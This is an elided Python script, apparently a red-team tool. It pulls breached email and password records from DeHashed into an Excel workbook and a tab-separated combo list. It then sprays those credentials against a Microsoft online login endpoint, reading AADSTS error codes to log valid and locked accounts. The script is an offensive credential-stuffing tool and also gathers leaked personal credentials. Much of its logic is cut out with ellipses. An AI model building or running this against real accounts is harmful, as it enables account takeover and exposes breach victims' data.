...
parser.add_argument("--url", default="https://microsoftonline.com", help="The URL to spray against")
...
spray_url = args.url.strip().rstrip('/')
...
output_dir = os.path.join(os.getcwd(), "DeHashed_Engagements")
os.makedirs(output_dir, exist_ok=True)

xlsx_filename = f"{query}_dehashed_report.xlsx"
...
ws_records.title = "Breach Records"
ws_records.append(headers)

ws_emails = wb.create_sheet(title="Unique Emails")
ws_emails.append(["unique_email_address"])

ws_combos = wb.create_sheet(title="Combo List")
ws_combos.append(["email_tab_password_format"])

ws_omitted = wb.create_sheet(title="Omitted Backups")
...
while True:
    ...
    for entry in entries:
        ...
        for key in headers:
            cleaned_entry_row.append(row_dict[key])

        column_a_email = row_dict["email"].strip("[]'\", ").lower()
        password_val = row_dict["password"].strip("[]'\", ")
...
for email in sorted(unique_emails):
    ws_emails.append([email])

if total_entries_processed > 0:
    wb.save(xlsx_filepath)
    with open(raw_json_filepath, 'w', encoding='utf-8') as json_out:
        json.dump(all_raw_json_entries, json_out, indent=4)
...
for u_email, u_pass in raw_combos_list:
    print(f"{u_email}\t{u_pass}")

print("==================================================\n", file=sys.stderr)

print("[+] Unique combinations compiled successfully above.", file=sys.stderr)
audit_confirm = input("Review complete? Press ENTER to fire the spray engine or type 'no' to abort: ").strip().lower()
if audit_confirm in ['no', 'n', 'quit', 'exit']:
    print("\n[-] Operation canceled during audit phase. Exiting safely.", file=sys.stderr)
    sys.exit(0)
print("\n[+] Verification confirmed. Launching spray machine...", file=sys.stderr)
print("--------------------------------------------------\n", file=sys.stderr)

if raw_combos_list:
    username_count = len(raw_combos_list)
        ...
        try:
            ...
            if r.status_code == 200:
                ...
                if "AADSTS51004" in error or "AADSTS16000" in error:
                    ...
                    lockout_counter += 1
                    valid_accounts_file = os.path.join(output_dir, f"{out_prefix}_locked_accounts.txt")
                    with open(valid_accounts_file, "a") as la_f:
                        la_f.write(f"{username}\n")
                    valid_emails += f"{username}\n"

                    if lockout_counter >= 10 and not force:
                        print(f"\n[!] ALERT: Threshold reached ({lockout_counter} lockouts detected!).", file=sys.stderr)
                    ...
                    for key in big_list_of_codes.keys():
                        if key in error:
                            in_list = True
                            print(f"WARNING! Account {username} : {password} unknown error encountered: {big_list_of_codes[key]}.")
                            break
                    if not in_list:
                        valid_emails += f"{username}\n"
...
print("\nAll tasks finalized successfully! Workspace data metrics generated inside engagement folder.")
